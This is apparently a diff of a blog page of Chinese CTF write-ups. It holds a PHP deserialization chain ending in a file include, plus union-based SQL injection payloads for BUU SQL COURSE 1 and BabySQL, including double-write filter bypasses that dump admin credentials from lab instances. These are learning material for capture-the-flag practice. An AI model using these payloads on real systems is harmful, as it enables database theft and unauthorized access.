class="variable">$test</span>();<span class="comment">//触发invoke</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//当一个对象被当成方法(函数)调用的时候触发</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;name;<span class="comment">//突破口,文件包含</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boogipop</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Air&#x27;s fans&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&quot;vegetable&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">admire</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;给air佬递茶&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">whoiam</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;airs fans&#x27;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name-&gt;name;<span class="comment">//触发_get</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vegetable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$important</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;important=<span class="keyword">new</span> <span class="title class_">Boogipop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;important-&gt;<span class="title function_ invoke__">whoiam</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;important=<span class="keyword">new</span> <span class="title class_">Boogipop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Vegetable</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;important=<span class="keyword">new</span> <span class="title class_">Boogipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;important-&gt;title=<span class="keyword">new</span> <span class="title class_">Air</span>();</span><br><span class="line"><span class="comment">// $a-&gt; important-&gt; title-&gt; title=new Air();</span></span><br><span class="line"><span class="variable">$add1</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/1:&#123;s:9/&quot;</span>,<span class="string">&quot;:2:&#123;s:9&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span> (<span class="title function_ invoke__">urlencode</span>(<span class="variable">$add1</span>)) ;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
 
-# BUU SQL COURSE 1
-
-## 涉及知识
-
-- sql注入漏洞
-- 联合查询
-
-## 解题过程
-
-首先寻找注入点, 通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：http://xxx.xxx.xxx/abcd.php?id=XX
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5df71feb-image.png)
-
-看到了输入用户名,密码的界面,首先尝试了一下万能密码,失败,登录界面貌似没有注入点,猜测在热点界面,图省事儿我就直接在火狐自带的操作台上抓包了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c6df5d1a-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ba6eda96-image.png)
-
-看到明显的sql注入字段,打开这个网页
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/aba85c98-image.png)
-
-判断为数字型注入
-
-判断字段数,用union select,利用其报错机制
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f890a8bb-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/21d7faa9-image.png)
-
-确定字段数为2
-
-> 还查到另外一种利用order by,order by3报错说明无法显示第三列,所以只有两列,同样可以知道字段数为2
-
-id的值进行修改，修改为数据库中不存在的值，就会将回显的位置腾出来
-
-暴库
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3805be39-image.png)看到多出来的那个news数据库尝试爆表
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/944155aa-image.png)
-
-查字段
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/61af94fe-image.png)
-
-按顺序查询,在admin这个表里面就可以看到我们想要知道的信息
-
-URL:[http://522e45ea-7676-4ed4-96b8-383302a7e723.node4.buuoj.cn:81/backend/content_detail.php?id=0](http://522e45ea-7676-4ed4-96b8-383302a7e723.node4.buuoj.cn:81/backend/content_detail.php?id=0) union select 1,group_concat(username,' ',password) from admin
-
-这里有一个' ',是为了让两串数据分开(防止我自己忘记,备注一下)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/450bb60e-image.png)
-
-用户名,密码登录得到flag
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b36a0db0-image.png)
-
-# [极客大挑战 2019]BabySQL
-
-首先判断注入类型尝试1 or 1=1
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/6a2686f0-image.png)
-
-尝试字符型1' or 1=1#
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a794ee94-image.png)
-
-发现,在user一栏,'or'空格,单引号,都被过滤了,在password一栏,or和空格被过滤了,双写绕过
-
-尝试`1' union select 1,2#`确定字段数,回显如下,发现select被过滤双写绕过后发现union也被禁止,双写
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5854376c-image.png)
-
-`1'uunionnion sselectelect 1,2,3#`
-
-返回数列为2,3,用哪一个都可以
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/312ffe20-image.png)
-
-查询当前数据库名`1'uunionnion sselectelect 1,2,database()#`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/20ede4b4-image.png)
-
-当前数据库名为geek,查询geek数据库
-
-`1'uunionnion sselectelect 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#`
-
-回显为` '.tables table_schema='geek'#'' `,对比起来一个个排除,where被ban了,然后,有个坑,因为之前已知or是被过滤了的,这里的information里面的or也会被滤掉,需要双写,然后from也被ban了
-
-最终的样子
-
-`1'uunionnion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e9012032-image.png)
-
-得到两个表,依次查询,第一个表和第二个表都返回如下图
-
-b4bsql,geekuser
-
-` 1'uunionnion sselectelect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'#`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2babfd32-image.png)
-
-得到了字段名,查询字段内容
-
-1'uunionnion sselectelect 1,2,group_concat(password) frfromom b4bsql#
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2974c4f6-image.png)
-
-em,烦人的or,双写得到password,然后flag就出来了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8a4ad5c4-image.png)
-
-其实一开始没有按顺序,先尝试了geek user表,得到用户名和密码,登录了没flag,才回过头来去b4bsql的,呜呜.
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bps81s6yu4nybb2s
-语雀文档ID: 111154681
-
+<h1 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h1><h2 id="涉及知识-7"><a href="#涉及知识-7" class="headerlink" title="涉及知识"></a>涉及知识</h2><ul>
+<li>sql注入漏洞</li>
+<li>联合查询</li>
+</ul>
+<h2 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先寻找注入点, 通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx/abcd.php?id=XX">http://xxx.xxx.xxx/abcd.php?id=XX</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5df71feb-image.png" alt="image.png"></p>
+<p>看到了输入用户名,密码的界面,首先尝试了一下万能密码,失败,登录界面貌似没有注入点,猜测在热点界面,图省事儿我就直接在火狐自带的操作台上抓包了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c6df5d1a-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ba6eda96-image.png" alt="image.png"></p>
+<p>看到明显的sql注入字段,打开这个网页</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/aba85c98-image.png" alt="image.png"></p>
+<p>判断为数字型注入</p>
+<p>判断字段数,用union select,利用其报错机制</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f890a8bb-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/21d7faa9-image.png" alt="image.png"></p>
+<p>确定字段数为2</p>
+<blockquote>
+<p>还查到另外一种利用order by,order by3报错说明无法显示第三列,所以只有两列,同样可以知道字段数为2</p>
+</blockquote>
+<p>id的值进行修改，修改为数据库中不存在的值，就会将回显的位置腾出来</p>
+<p>暴库</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3805be39-image.png" alt="image.png">看到多出来的那个news数据库尝试爆表</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/944155aa-image.png" alt="image.png"></p>
+<p>查字段</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/61af94fe-image.png" alt="image.png"></p>
+<p>按顺序查询,在admin这个表里面就可以看到我们想要知道的信息</p>
+<p>URL:<a target="_blank" rel="noopener" href="http://522e45ea-7676-4ed4-96b8-383302a7e723.node4.buuoj.cn:81/backend/content_detail.php?id=0">http://522e45ea-7676-4ed4-96b8-383302a7e723.node4.buuoj.cn:81/backend/content_detail.php?id&#x3D;0</a> union select 1,group_concat(username,’ ‘,password) from admin</p>
+<p>这里有一个’ ‘,是为了让两串数据分开(防止我自己忘记,备注一下)</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/450bb60e-image.png" alt="image.png"></p>
+<p>用户名,密码登录得到flag</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b36a0db0-image.png" alt="image.png"></p>
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>首先判断注入类型尝试1 or 1&#x3D;1</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/6a2686f0-image.png" alt="image.png"></p>
+<p>尝试字符型1’ or 1&#x3D;1#</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/a794ee94-image.png" alt="image.png"></p>
+<p>发现,在user一栏,’or’空格,单引号,都被过滤了,在password一栏,or和空格被过滤了,双写绕过</p>
+<p>尝试<code>1&#39; union select 1,2#</code>确定字段数,回显如下,发现select被过滤双写绕过后发现union也被禁止,双写</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5854376c-image.png" alt="image.png"></p>
+<p><code>1&#39;uunionnion sselectelect 1,2,3#</code></p>
+<p>返回数列为2,3,用哪一个都可以</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/312ffe20-image.png" alt="image.png"></p>
+<p>查询当前数据库名<code>1&#39;uunionnion sselectelect 1,2,database()#</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/20ede4b4-image.png" alt="image.png"></p>
+<p>当前数据库名为geek,查询geek数据库</p>
+<p><code>1&#39;uunionnion sselectelect 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p>
+<p>回显为<code>&#39;.tables table_schema=&#39;geek&#39;#&#39;&#39;</code>,对比起来一个个排除,where被ban了,然后,有个坑,因为之前已知or是被过滤了的,这里的information里面的or也会被滤掉,需要双写,然后from也被ban了</p>
+<p>最终的样子</p>
+<p><code>1&#39;uunionnion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e9012032-image.png" alt="image.png"></p>
+<p>得到两个表,依次查询,第一个表和第二个表都返回如下图</p>
+<p>b4bsql,geekuser</p>
+<p><code> 1&#39;uunionnion sselectelect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;geekuser&#39;#</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2babfd32-image.png" alt="image.png"></p>
+<p>得到了字段名,查询字段内容</p>
+<p>1’uunionnion sselectelect 1,2,group_concat(password) frfromom b4bsql#</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2974c4f6-image.png" alt="image.png"></p>
+<p>em,烦人的or,双写得到password,然后flag就出来了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8a4ad5c4-image.png" alt="image.png"></p>
+<p>其实一开始没有按顺序,先尝试了geek user表,得到用户名和密码,登录了没flag,才回过头来去b4bsql的,呜呜.</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bps81s6yu4nybb2s">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/bps81s6yu4nybb2s</a><br>语雀文档ID: 111154681</p>
 
     </div>
 
@@ -1564,9 +1022,10 @@ em,烦人的or,双写得到password,然后flag就出来了
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag"># 极客大挑战</a>
           </div>
 
         
@@ -1575,8 +1034,8 @@ em,烦人的or,双写得到password,然后flag就出来了
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/09/16/07-%E5%88%B7%E9%A2%98/" rel="prev" title="刷题">
-      <i class="fa fa-chevron-left"></i> 刷题
+    <a href="/2026/09/16/06-%E6%AF%94%E8%B5%9Bwp/" rel="prev" title="比赛wp">
+      <i class="fa fa-chevron-left"></i> 比赛wp
     </a></div>
       <div class="post-nav-item">
     <a href="/2026/09/16/09-buuctf%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98wp/" rel="next" title="buuctf攻防世界刷题wp">
@@ -1640,6 +1099,7 @@ em,烦人的or,双写得到password,然后flag就出来了
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">PHP特性+命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-1"><span class="nav-number">3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">第一次解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun1"><span class="nav-number">5.</span> <span class="nav-text">[极客大挑战 2019]Havefun1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86"><span class="nav-number">5.1.</span> <span class="nav-text">涉及知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">5.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%85%8D%E7%BD%AE%E5%A5%BDhackbar%E6%8F%92%E4%BB%B6"><span class="nav-number">5.2.1.</span> <span class="nav-text">1.配置好hackbar插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="nav-number">5.2.2.</span> <span class="nav-text">2.进入靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%93%8D%E4%BD%9C"><span class="nav-number">5.2.3.</span> <span class="nav-text">3.操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1"><span class="nav-number">6.</span> <span class="nav-text">[ACTF2020 新生赛]Exec1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-1"><span class="nav-number">6.1.</span> <span class="nav-text">涉及知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="nav-number">6.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="nav-number">6.2.1.</span> <span class="nav-text">进入题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95ping%E8%AF%A5%E7%BD%91%E9%A1%B5%E7%9A%84%E5%9F%9F%E5%90%8D"><span class="nav-number">6.2.2.</span> <span class="nav-text">尝试ping该网页的域名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AF%A6%E8%A7%A3"><span class="nav-number">6.3.</span> <span class="nav-text">知识点详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ping%E5%91%BD%E4%BB%A4"><span class="nav-number">6.3.1.</span> <span class="nav-text">ping命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E5%9D%80%E7%9A%84%E7%BB%84%E6%88%90"><span class="nav-number">6.3.2.</span> <span class="nav-text">网址的组成</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">7.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-2"><span class="nav-number">7.1.</span> <span class="nav-text">涉及知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ping"><span class="nav-number">7.1.1.</span> <span class="nav-text">ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E8%81%94%E5%90%88%E6%89%A7%E8%A1%8C"><span class="nav-number">7.1.2.</span> <span class="nav-text">linux联合执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%A7%BF%E5%8A%BF"><span class="nav-number">7.1.3.</span> <span class="nav-text">空格绕过的一些小姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">7.1.4.</span> <span class="nav-text">敏感字符绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99%EF%BC%8C%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D"><span class="nav-number">7.1.5.</span> <span class="nav-text">正则表达式匹配规则，贪婪匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-match%E5%87%BD%E6%95%B0"><span class="nav-number">7.1.6.</span> <span class="nav-text">preg_match函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-2"><span class="nav-number">7.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-number">7.2.1.</span> <span class="nav-text">题目环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E5%B0%9D%E8%AF%95ping%E4%B8%80%E4%B8%8B%E9%80%9A%E8%BF%87burpsuite%E5%BE%97%E5%88%B0%E7%9A%84IP"><span class="nav-number">7.2.2.</span> <span class="nav-text">根据题目尝试ping一下通过burpsuite得到的IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0flag%E7%94%A8cat%E8%8E%B7%E5%8F%96"><span class="nav-number">7.2.3.</span> <span class="nav-text">发现flag用cat获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%B0%9D%E8%AF%95"><span class="nav-number">7.2.4.</span> <span class="nav-text">绕过尝试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.4.1.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6flag%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.4.2.</span> <span class="nav-text">敏感字符flag绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%86%85%E6%95%9B%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.4.2.0.1.</span> <span class="nav-text">内敛绕过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.4.2.0.2.</span> <span class="nav-text">base64编码绕过</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB"><span class="nav-number">7.3.</span> <span class="nav-text">知识汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D"><span class="nav-number">7.3.1.</span> <span class="nav-text">贪婪匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%B6%89%E5%8F%8Abush%E5%92%8Csh"><span class="nav-number">7.3.2.</span> <span class="nav-text">源代码中涉及bush和sh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cat%E4%B8%8Etac"><span class="nav-number">7.3.3.</span> <span class="nav-text">cat与tac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">7.3.4.</span> <span class="nav-text">重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E2%80%99-%E2%80%98"><span class="nav-number">7.3.4.1.</span> <span class="nav-text">重定向符’|‘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E2%80%99-%E2%80%98%EF%BC%8C%E2%80%99"><span class="nav-number">7.3.4.2.</span> <span class="nav-text">重定向符’&gt;‘，’&lt;‘（临时）完了会自动恢复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-number">7.3.4.3.</span> <span class="nav-text">exec</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="nav-number">8.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-3"><span class="nav-number">8.1.</span> <span class="nav-text">涉及知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#is-numeric-%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">8.1.1.</span> <span class="nav-text">is_numeric()函数安全漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E7%AD%89%E4%BA%8E%E7%BB%95%E8%BF%87"><span class="nav-number">8.1.2.</span> <span class="nav-text">弱等于绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E4%BC%AA%E9%80%A0"><span class="nav-number">8.1.3.</span> <span class="nav-text">cookie伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="nav-number">8.1.3.1.</span> <span class="nav-text">cookie机制：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">8.1.3.2.</span> <span class="nav-text">漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strmp%EF%BC%88%EF%BC%89"><span class="nav-number">8.1.4.</span> <span class="nav-text">strmp（）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-3"><span class="nav-number">8.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E4%BC%AA%E9%80%A0%E5%AE%9E%E6%93%8D"><span class="nav-number">8.2.1.</span> <span class="nav-text">cookie伪造实操</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#burp-suite%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="nav-number">8.2.2.</span> <span class="nav-text">burp suite的简单使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87is-numeric-%E5%87%BD%E6%95%B0%EF%BC%8C%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">8.2.3.</span> <span class="nav-text">绕过is_numeric()函数，弱类型比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stremp-%E7%BB%95%E8%BF%87"><span class="nav-number">8.2.4.</span> <span class="nav-text">stremp()绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">9.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-4"><span class="nav-number">9.1.</span> <span class="nav-text">涉及知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%92%8C%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="nav-number">9.1.1.</span> <span class="nav-text">请求头和响应头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E5%87%BD%E6%95%B0"><span class="nav-number">9.1.2.</span> <span class="nav-text">md5函数</span></a><ol class="nav-child"><li class="nav-item 